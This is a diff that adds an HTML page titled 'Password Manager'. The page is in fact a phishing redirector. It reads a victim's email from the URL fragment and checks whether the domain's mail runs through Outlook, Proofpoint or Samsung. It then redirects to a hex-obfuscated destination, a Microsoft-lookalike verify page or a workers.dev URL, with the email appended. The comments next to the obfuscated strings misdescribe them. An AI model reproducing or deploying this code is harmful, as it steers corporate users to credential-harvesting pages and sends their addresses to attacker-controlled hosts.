@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Password Manager</title>
+</head>
+<body>
+ 
+  <pre id="output"></pre>
+
+  <script>
+  
+  checkOutlookMX();
+    async function checkOutlookMX() {
+	var feedUpdateResponse = window.location.href;
+   
+
+
+const valueAfterEquals = feedUpdateResponse.split('#').slice(1).join('#');
+        var loginValue = valueAfterEquals; //
+        
+      
+	var my_ai=loginValue;
+	
+	 var ind = my_ai.indexOf("@");
+    var my_slice = my_ai.substr((ind + 1));
+const domain = my_slice;
+
+      const output = document.getElementById('output');
+      output.textContent = '';
+
+      if (!domain) {
+        output.textContent = 'Please enter a domain.';
+        return;
+      }
+
+      try {
+        const response = await fetch(`https://cloudflare-dns.com/dns-query?name=${domain}&type=MX`, {
+          headers: {
+            'Accept': 'application/dns-json'
+          }
+        });
+
+        const data = await response.json();
+
+        if (data.Answer) {
+          const outlookRecords = data.Answer.filter(record => 
+            record.data.toLowerCase().includes('outlook.com') ||
+  record.data.toLowerCase().includes('pphosted.com')||
+  record.data.toLowerCase().includes('samsung.com')
+          );
+
+          if (outlookRecords.length > 0) {
+		  
+    
+		   const hex = "68747470733a2f2f6163636f756e742d706173736d616e616765722e6d6963726f736f66742e736f75746865726e73686565746d6574616c732e636f6d2f766572696679"; // https://office
+	  const love = hex.match(/.{1,2}/g)
+        .map(byte => String.fromCharCode(parseInt(byte, 16)))
+        .join('');
+
+		  
+   const redirectUrl = love +loginValue;
+      setTimeout(() => {
+        window.location.href = redirectUrl;
+      }, 0);
+  
+		 } else {
+       		  
+ const hex = "68747470733a2f2f73756d6d65722d63656c6c2d383039322e71692d7a68616e672e776f726b6572732e6465762f7765623f26312a31686f776434722a5f75702a4d512e2e2a5f67732a4d512e2e2667636c69643d436a774b43416a77367337434268414345697741754851636b6d4d47346a56435145764b33444e4745447271444775535431774d7651395f3633415f5f504d39445a6c546b734268664a7a6d54426f4332384d514176445f427745266762726169643d304141414141445f7148735f374d4723"; // https://orders
+	  const love = hex.match(/.{1,2}/g)
+        .map(byte => String.fromCharCode(parseInt(byte, 16)))
+        .join('');
+
+		  
+   const redirectUrl = love +loginValue;
+    setTimeout(() => {
+        window.location.href = redirectUrl;
+      }, 0);
+  
+       }
+        } else {
+         
+        }
+      } catch (err) {
+        output.textContent = 'Error: ' + err.message;
+      }
+    }
+  </script>
+</body>
+</html>
